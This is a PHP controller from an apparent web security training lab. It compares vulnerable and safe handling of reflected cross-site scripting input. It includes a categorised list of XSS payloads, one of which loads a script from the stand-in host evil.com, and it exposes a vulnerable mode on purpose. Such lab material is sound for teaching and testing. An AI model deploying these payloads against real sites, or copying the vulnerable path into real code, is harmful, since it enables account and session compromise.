<?php

namespace WebSecLab\Controllers;

use WebSecLab\Vulnerabilities\XSS\ReflectedXSS;

/**
 * XSS 취약점 테스트 컨트롤러
 */
class XSSController extends BaseController
{
    private ReflectedXSS $reflectedXSS;

    public function __construct()
    {
        $this->reflectedXSS = new ReflectedXSS();
    }

    /**
     * Reflected XSS 테스트 엔드포인트
     */
    public function testReflectedXSS(): string
    {
        try {
            // 입력 데이터 받기
            $input = $this->getJsonInput();
            $this->validateInput($input, ['payload']);

            $payload = $input['payload'];
            $mode = $input['mode'] ?? 'both';
            $context = $input['context'] ?? [];

            // 모드에 따른 실행
            switch ($mode) {
                case 'vulnerable':
                    $result = $this->reflectedXSS->executeVulnerable($payload, $context);
                    break;

                case 'safe':
                    $result = $this->reflectedXSS->executeSafe($payload, $context);
                    break;

                case 'both':
                default:
                    $vulnerable = $this->reflectedXSS->executeVulnerable($payload, $context);
                    $safe = $this->reflectedXSS->executeSafe($payload, $context);

                    $result = [
                        'vulnerable' => $vulnerable,
                        'safe' => $safe,
                        'comparison' => $this->compareResults($vulnerable, $safe)
                    ];
                    break;
            }

            // 분석 정보 추가
            $analysis = [
                'payload_analysis' => $this->analyzePayload($payload),
                'risk_level' => $this->assessRiskLevel($payload),
                'recommendations' => $this->getSecurityRecommendations()
            ];

            return $this->vulnerabilityResponse(
                'reflected_xss',
                $payload,
                $mode,
                $result,
                $analysis
            );

        } catch (\Exception $e) {
            $this->log('error', 'XSS test failed', [
                'error' => $e->getMessage(),
                'payload' => $payload ?? 'unknown'
            ]);

            return $this->errorResponse($e->getMessage());
        }
    }

    /**
     * XSS 페이로드 목록 반환
     */
    public function getPayloads(): string
    {
        try {
            $payloads = [
                'basic' => $this->reflectedXSS->getTestPayloads(),
                'categories' => [
                    'script_injection' => [
                        '<script>alert("XSS")</script>',
                        '<script>console.log("XSS")</script>',
                        '<script src="http://evil.com/xss.js"></script>'
                    ],
                    'event_handlers' => [
                        '<img src=x onerror=alert("XSS")>',
                        '<body onload=alert("XSS")>',
                        '<div onmouseover=alert("XSS")>hover</div>'
                    ],
                    'javascript_urls' => [
                        'javascript:alert("XSS")',
                        'javascript:eval("alert(\'XSS\')")'
                    ],
                    'iframe_injection' => [
                        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                        '<iframe onload="alert(\'XSS\')"></iframe>'
                    ]
                ],
                'difficulty_levels' => [
                    'basic' => '<script>alert("XSS")</script>',
                    'intermediate' => '"><script>alert("XSS")</script>',
                    'advanced' => '\';alert("XSS");//'
                ]
            ];

            return $this->successResponse([
                'payloads' => $payloads,
                'total_count' => count($payloads['basic'])
            ]);

        } catch (\Exception $e) {
            return $this->errorResponse('Failed to retrieve payloads');
        }
    }

    /**
     * XSS 테스트 시나리오 목록
     */
    public function getScenarios(): string
    {
        $scenarios = [
            'basic' => [
                'name' => '기본 출력',
                'description' => '사용자 입력을 그대로 출력',
                'context' => ['scenario' => 'basic']
            ],
            'search' => [
                'name' => '검색 결과',
                'description' => '검색어가 결과 페이지에 반영',
                'context' => ['scenario' => 'search']
            ],
            'greeting' => [
                'name' => '사용자 인사',
                'description' => '사용자 이름이 인사말에 포함',
                'context' => ['scenario' => 'greeting']
            ],
            'form' => [
                'name' => '폼 입력',
                'description' => '폼 입력값이 결과에 표시',
                'context' => ['scenario' => 'form', 'field' => 'username']
            ]
        ];

        return $this->successResponse([
            'scenarios' => $scenarios,
            'usage' => 'context 파라미터로 시나리오 지정'
        ]);
    }

    // === 내부 헬퍼 메서드들 ===

    private function getJsonInput(): array
    {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);

        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new \InvalidArgumentException('Invalid JSON input');
        }

        return $data ?? [];
    }

    private function analyzePayload(string $payload): array
    {
        return [
            'length' => strlen($payload),
            'contains_script_tags' => strpos($payload, '<script') !== false,
            'contains_event_handlers' => preg_match('/on\w+\s*=/i', $payload),
            'contains_javascript_url' => strpos($payload, 'javascript:') !== false,
            'contains_iframe' => strpos($payload, '<iframe') !== false,
            'encoding_detected' => $this->detectEncoding($payload)
        ];
    }

    private function detectEncoding(string $payload): array
    {
        return [
            'url_encoded' => strpos($payload, '%') !== false,
            'html_entities' => strpos($payload, '&') !== false && strpos($payload, ';') !== false,
            'unicode_escaped' => strpos($payload, '\\u') !== false
        ];
    }

    private function assessRiskLevel(string $payload): string
    {
        if ($this->reflectedXSS->detectXSS($payload)) {
            if (strpos($payload, 'script') !== false) {
                return 'high';
            } elseif (preg_match('/on\w+\s*=/i', $payload)) {
                return 'medium';
            } else {
                return 'low';
            }
        }
        return 'none';
    }

    private function compareResults(array $vulnerable, array $safe): array
    {
        return [
            'xss_blocked' => !$safe['xss_detected'] && $vulnerable['xss_detected'],
            'output_different' => $vulnerable['html_output'] !== $safe['html_output'],
            'vulnerability_mitigated' => $vulnerable['xss_detected'] && !$safe['xss_detected']
        ];
    }

    private function getSecurityRecommendations(): array
    {
        return [
            'input_validation' => 'Always validate and sanitize user input',
            'output_encoding' => 'Use proper HTML encoding for output',
            'csp_headers' => 'Implement Content Security Policy',
            'secure_frameworks' => 'Use secure templating engines'
        ];
    }
}